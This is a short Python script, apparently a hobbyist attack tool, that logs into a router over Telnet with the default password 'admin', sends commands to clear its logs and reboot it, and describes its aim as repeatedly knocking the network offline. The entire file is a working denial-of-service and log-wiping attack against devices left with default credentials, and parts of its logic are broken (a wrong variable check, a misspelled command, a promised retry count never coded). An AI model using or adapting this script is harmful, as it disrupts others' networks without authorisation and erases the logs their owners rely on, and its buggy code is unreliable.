from __future__ import print_function

import os
import time
import telnetlib
import sys
import random

"""
Connects to router via Telnet, logs in with default password
tells the router to clear all logs and reboot
tries again, but if it fails it'll kill it self as a process
Think of this as a spewing mess coming out of a volcano,
it dosn't stop, except it tries to DOS the network 15 times
and waits 15 seconds, this is
225 seconds in total.
"""

# -------------- #
HOST = "192.168.1.1"
PASSWORD = "admin"
# -------------- #

GLOBAL_ERROR_COUNT = 0

def main():
	check1 = check()
	control(check1)
	dos()
	close()


def control(check1):
	global GLOBAL_ERROR_COUNT
	if check == False:
		GLOBAL_ERROR_COUNT += 1
		if GLOBAL_ERROR_COUNT > 4:
			close()

def dos():
	password = (PASSWORD.encode())
	try:
		tn = telnetlib.Telnet(HOST)
	except Exception as e:
		global GLOBAL_ERROR_COUNT
		GLOBAL_ERROR_COUNT += 1
		if GLOBAL_ERROR_COUNT > 5:
			close()
		main()

	if password:
		tn.read_until("Password: ".encode())
		tn.write(password + "\n".encode())

	tn.write("sys log cleart\n".encode())
	tn.write("sys reboot\n".encode())
	tn.close()


def check():
	while True:
		response = os.system("ping -c 1 " + HOST)
		print(response)
		if response == 0:
			return True
		else:
			return False

def close():
	sys.exit()

if __name__ == "__main__":
	main()


